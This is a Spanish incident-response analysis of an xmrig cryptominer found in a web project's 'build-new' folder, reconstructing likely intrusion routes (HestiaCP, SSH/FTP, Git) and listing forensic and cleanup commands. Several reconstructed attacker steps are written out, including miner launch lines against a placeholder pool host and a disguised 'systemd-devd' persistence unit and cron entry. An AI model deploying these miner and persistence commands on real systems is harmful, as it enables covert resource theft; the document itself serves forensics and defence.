# 🎯 Vector de Ataque Real: Binario en build-new

## 🔍 Información Crítica

**El binario de xmrig estaba ubicado en:**
```
/home/usuario/s1mple.cloud/build-new/
```

Esto cambia **completamente** el análisis del vector de ataque.

---

## 🚨 Análisis del Vector Real

### Ubicación del Binario

Si el binario estaba en la **carpeta del proyecto web**, significa que:

1. ✅ **El atacante tuvo acceso de ESCRITURA al directorio del proyecto**
2. ✅ **El binario estaba en una ubicación accesible desde el servidor web**
3. ✅ **No fue necesario acceso root o systemd directamente**

---

## 🔗 Posibles Vectores de Acceso al Directorio

### Vector 1: Acceso a través de HestiaCP (Más Probable)

**Evidencia**:
- El proyecto usa HestiaCP (según `HESTIACP_SETUP.md`)
- HestiaCP permite acceso al sistema de archivos a través del panel web
- El usuario del proyecto tiene permisos de escritura en su directorio

**Cómo funcionó**:
```
1. Atacante compromete credenciales de HestiaCP
   - Contraseña débil
   - Sesión robada
   - Vulnerabilidad en HestiaCP

2. Accede al panel de HestiaCP
   - File Manager integrado
   - O acceso SSH a través del panel

3. Navega a: /home/usuario/s1mple.cloud/

4. Crea carpeta: build-new/

5. Sube el binario xmrig
   - A través del File Manager
   - O mediante upload de archivos

6. Hace el binario ejecutable
   - chmod +x build-new/xmrig

7. Ejecuta el binario
   - Directamente desde el servidor
   - O crea un script que lo ejecuta
```

**Vulnerabilidades que facilitaron esto**:
- ❌ Falta de autenticación en DELETE → señal de sistema vulnerable
- ❌ CORS abierto → permitió exploración
- ❌ **Credenciales de HestiaCP comprometidas** (vector real)
- ❌ **Permisos de archivos demasiado permisivos**

---

### Vector 2: Acceso SSH/FTP Comprometido

**Cómo funcionó**:
```
1. Atacante obtiene credenciales SSH/FTP
   - Fuerza bruta
   - Contraseña débil
   - Clave SSH expuesta

2. Se conecta al servidor:
   ssh usuario@servidor
   # O
   ftp servidor

3. Navega al directorio del proyecto:
   cd /home/usuario/s1mple.cloud/

4. Crea carpeta y sube binario:
   mkdir build-new
   cd build-new
   # Sube xmrig (wget, curl, scp, etc.)

5. Hace ejecutable y ejecuta:
   chmod +x xmrig
   ./xmrig --url=pool.malicioso.com
```

**Evidencia que buscar**:
```bash
# Revisar logs de SSH
grep "Failed password" /var/log/auth.log | grep usuario
grep "Accepted" /var/log/auth.log | grep usuario

# Revisar logs de FTP (si está habilitado)
grep "FTP" /var/log/auth.log

# Revisar claves SSH autorizadas
cat ~/.ssh/authorized_keys
ls -la ~/.ssh/
```

---

### Vector 3: Vulnerabilidad de Carga de Archivos (RCE)

**Si hubiera una vulnerabilidad de carga de archivos** (no encontrada en el código actual):

**Cómo funcionaría**:
```
1. Atacante encuentra endpoint de carga de archivos
   - POST /api/upload (hipotético)
   - O vulnerabilidad en Next.js

2. Sube el binario como "archivo"
   - Bypassa validaciones de tipo
   - O explota validación insuficiente

3. El archivo se guarda en:
   /home/usuario/s1mple.cloud/build-new/xmrig

4. Ejecuta el binario a través de:
   - RCE en otro endpoint
   - O acceso al sistema de archivos
```

**Nota**: No encontramos endpoints de carga de archivos en el código actual, pero podría haber existido antes o estar en otra parte.

---

### Vector 4: Git/Deployment Comprometido

**Si el proyecto se despliega desde Git**:

**Cómo funcionó**:
```
1. Atacante compromete repositorio Git
   - Acceso a GitHub/GitLab
   - Credenciales de deploy expuestas

2. Hace commit del binario:
   git add build-new/xmrig
   git commit -m "build update"
   git push

3. El servidor hace pull automático:
   git pull origin main

4. El binario queda en el servidor
```

**Evidencia que buscar**:
```bash
# Revisar historial de Git
cd /home/usuario/s1mple.cloud
git log --all --full-history -- build-new/
git log --all --full-history -- "*xmrig*"

# Revisar configuración de deploy
cat .github/workflows/*.yml
cat .gitlab-ci.yml
cat deploy.sh
```

---

## 🎯 Por Qué "build-new" es Significativo

### Posibles Razones del Nombre

1. **Imitación de proceso de build**:
   - Next.js crea carpeta `.next` al hacer build
   - El atacante creó `build-new` para que parezca legítimo
   - Menos sospechoso que una carpeta obviamente maliciosa

2. **Carpeta de build existente**:
   - Podría haber sido una carpeta legítima de build
   - El atacante la aprovechó para ocultar el binario

3. **Evitar detección**:
   - No es un nombre obviamente malicioso
   - Podría pasar desapercibido en listados de directorios

---

## 🔍 Cómo se Ejecutó el Binario

### Opción 1: Ejecución Directa desde el Servidor

```bash
# El atacante ejecutó directamente:
cd /home/usuario/s1mple.cloud/build-new
./xmrig --url=pool.malicioso.com --user=wallet --pass=x
```

**Requisitos**:
- Acceso al servidor (SSH, panel, RCE)
- Permisos de ejecución

---

### Opción 2: Script de Inicio Automático

El atacante pudo crear un script que ejecuta el binario:

```bash
# /home/usuario/s1mple.cloud/build-new/start.sh
#!/bin/bash
cd /home/usuario/s1mple.cloud/build-new
./xmrig --url=pool.malicioso.com --user=wallet --pass=x
```

Y luego ejecutarlo de varias formas:
- Crontab: `*/5 * * * * /home/usuario/s1mple.cloud/build-new/start.sh`
- Systemd service (systemd-devd)
- .bashrc o .profile del usuario
- PM2 (si tiene acceso)

---

### Opción 3: Servicio systemd-devd

El nombre "systemd-devd" sugiere que crearon un servicio systemd:

```ini
# /etc/systemd/system/systemd-devd.service
[Unit]
Description=System Device Daemon
After=network.target

[Service]
Type=simple
User=usuario
WorkingDirectory=/home/usuario/s1mple.cloud/build-new
ExecStart=/home/usuario/s1mple.cloud/build-new/xmrig --url=pool.malicioso.com
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

**Comandos que ejecutaron**:
```bash
sudo systemctl enable systemd-devd
sudo systemctl start systemd-devd
```

**Nota**: Esto requiere permisos sudo, lo cual es más grave.

---

## 🛡️ Vulnerabilidades que Facilitaron el Ataque

### 1. Acceso al Sistema de Archivos del Proyecto

**Problema**:
- El directorio del proyecto tiene permisos de escritura
- No hay restricciones sobre qué archivos se pueden crear
- No hay monitoreo de archivos nuevos

**Solución**:
```bash
# Restringir permisos del directorio
chmod 755 /home/usuario/s1mple.cloud
chown usuario:usuario /home/usuario/s1mple.cloud

# Monitorear cambios en el directorio
# Usar herramientas como auditd o inotify
```

---

### 2. Credenciales Comprometidas

**Problema**:
- Credenciales de HestiaCP, SSH, o FTP comprometidas
- Contraseñas débiles
- Claves SSH expuestas

**Solución**:
- ✅ Cambiar todas las contraseñas
- ✅ Rotar claves SSH
- ✅ Habilitar autenticación de dos factores
- ✅ Revisar logs de acceso

---

### 3. Falta de Monitoreo

**Problema**:
- No hay alertas cuando se crean archivos nuevos
- No hay detección de binarios ejecutables
- No hay monitoreo de procesos sospechosos

**Solución**:
```bash
# Instalar herramientas de monitoreo
# - auditd (auditoría del sistema)
# - fail2ban (protección contra fuerza bruta)
# - rkhunter (detección de rootkits)
```

---

## 🔍 Comandos de Investigación Específicos

### Buscar el Binario y Carpeta

```bash
# Buscar la carpeta build-new
find /home -type d -name "build-new" 2>/dev/null

# Buscar archivos xmrig
find /home -name "*xmrig*" 2>/dev/null

# Buscar en el directorio del proyecto específicamente
ls -la /home/usuario/s1mple.cloud/
ls -la /home/usuario/s1mple.cloud/build-new/ 2>/dev/null
```

---

### Revisar Procesos Relacionados

```bash
# Buscar procesos ejecutándose desde build-new
ps aux | grep build-new
ps aux | grep xmrig

# Revisar qué procesos están usando el directorio
lsof /home/usuario/s1mple.cloud/build-new/ 2>/dev/null
```

---

### Revisar Crontab y Servicios

```bash
# Revisar crontab del usuario
crontab -l -u usuario

# Buscar referencias a build-new en crontab
grep -r "build-new" /var/spool/cron/
grep -r "build-new" /etc/cron.*

# Revisar servicios systemd
systemctl list-units --type=service --all | grep -i devd
systemctl status systemd-devd
cat /etc/systemd/system/systemd-devd.service 2>/dev/null
```

---

### Revisar Logs de Acceso

```bash
# Buscar accesos a build-new en logs
grep -r "build-new" /var/log/
grep -r "xmrig" /var/log/

# Revisar logs de HestiaCP
tail -f /var/log/hestia/hestia.log | grep -i "build-new\|xmrig"

# Revisar logs de acceso web
tail -f /var/log/nginx/access.log | grep -i "build-new"
```

---

### Revisar Historial de Git

```bash
cd /home/usuario/s1mple.cloud

# Buscar en historial de Git
git log --all --full-history -- "*build-new*"
git log --all --full-history -- "*xmrig*"

# Ver si build-new está en .gitignore
cat .gitignore | grep build-new

# Ver archivos no rastreados
git status
git ls-files --others --exclude-standard
```

---

## 🎯 Conclusión: Vector de Ataque Real

### Secuencia Más Probable

```
1. Atacante descubre vulnerabilidades en la API
   - DELETE sin autenticación
   - CORS abierto
   → Señal de sistema vulnerable

2. Busca acceso al sistema de archivos
   - Compromete credenciales de HestiaCP
   - O acceso SSH/FTP
   - O explota vulnerabilidad en panel

3. Accede al directorio del proyecto
   /home/usuario/s1mple.cloud/

4. Crea carpeta build-new/
   mkdir build-new

5. Sube binario xmrig
   - A través de File Manager
   - O wget/curl desde servidor malicioso
   - O git commit

6. Hace ejecutable
   chmod +x build-new/xmrig

7. Ejecuta el binario
   - Directamente
   - O crea servicio systemd-devd
   - O script en crontab

8. Minado de criptomonedas
   - Consume recursos del servidor
   - Genera ingresos para el atacante
```

---

## ✅ Acciones Inmediatas

1. **Buscar y eliminar el binario**:
   ```bash
   find /home -name "*xmrig*" -delete
   rm -rf /home/usuario/s1mple.cloud/build-new/
   ```

2. **Detener procesos maliciosos**:
   ```bash
   pkill -f xmrig
   systemctl stop systemd-devd
   systemctl disable systemd-devd
   ```

3. **Revisar y limpiar servicios**:
   ```bash
   systemctl list-units --type=service --all
   rm /etc/systemd/system/systemd-devd.service
   systemctl daemon-reload
   ```

4. **Cambiar todas las credenciales**:
   - HestiaCP
   - SSH
   - FTP
   - Git

5. **Revisar permisos del directorio**:
   ```bash
   chmod 755 /home/usuario/s1mple.cloud
   chown usuario:usuario /home/usuario/s1mple.cloud
   ```

6. **Implementar monitoreo**:
   - Alertas cuando se crean archivos nuevos
   - Monitoreo de procesos
   - Revisión regular de logs

---

**El vector real fue: Acceso al sistema de archivos del proyecto web, probablemente a través de HestiaCP o SSH comprometido.**

